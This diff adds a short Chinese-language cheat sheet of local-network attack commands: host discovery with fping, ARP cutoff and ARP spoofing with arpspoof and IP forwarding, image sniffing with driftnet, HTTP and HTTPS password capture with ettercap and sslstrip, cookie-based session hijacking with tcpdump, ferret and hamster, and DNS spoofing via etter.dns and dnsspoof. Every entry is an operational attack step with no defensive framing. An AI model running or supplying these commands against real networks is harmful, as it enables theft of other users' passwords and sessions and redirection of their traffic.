@@ -1,0 +1,34 @@
+* 1. 侦查内网活动主机
+** fping -asg 192.168.2.0/24
+
+* 2. arp断网攻击
+** arpspoof -i 网卡 -t 目标IP 网关
+
+* 3. arp欺骗
+** echo 1 > /proc/sys/net/ipv4/ip_forward ;;打开路由转发功能
+** arpspoof -i 网卡 -t 目标IP 网关
+** arpspoof -i 网卡 -t 网关 目标IP
+
+* 4. 过滤图片流量
+** driftnet -i wlan0 -a -d 保存目录
+
+* 5. HTTP帐号密码获取
+** ettercap -Tq -i wlan0
+
+* 6. HTTPS帐号密码获取
+** /etc/ettercap/etter.conf 中的iptables下面两行去掉注释
+** sslstrip -a -f -k转换HTTPS为HTTP
+** ettercap -Tq -i wlan0进行抓包
+
+* 7. 会话劫持
+** tcpdump -i wlan0 -w cookie.cap ;;或者wireshark抓包保存为.pcap格式
+** ferret -r cookie.cap ;; 或者cookie.pcap --分析抓取的数据包
+** hamster ;;架设代理,登录会话
+** firefox 设置代理为127.0.0.1:1234 并浏览器打开
+** 选中目标IP，筛选合适的cookie并打开
+
+* 8. DNS欺骗
+** 修改/etc/ettercap/etter.dns 文件,添加域名重定向到本机IP
+** dnsspoof -i wlan0 实行DNS欺骗
+** 受害机ping 域名可以看出是攻击者的IP
+
